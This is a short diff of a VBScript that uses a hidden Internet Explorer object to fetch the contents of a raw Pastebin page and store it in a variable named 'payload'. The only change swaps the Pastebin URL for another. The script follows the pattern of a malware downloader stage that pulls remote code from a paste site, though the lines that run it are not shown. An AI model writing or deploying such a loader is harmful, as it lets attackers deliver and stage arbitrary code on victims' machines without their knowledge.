@@ -1,5 +1,5 @@
 Set ie = CreateObject("InternetExplorer.Application")
-ie.Navigate "https://pastebin.com/raw/Pb77wncK"
+ie.Navigate "https://pastebin.com/raw/qnpTk1m5"
 State = 0
 Do Until State = 4: DoEvents: State = ie.readyState: Loop
 Dim payload: payload = ie.Document.Body.getElementsByTagName("pre").Item(0).innerHTML
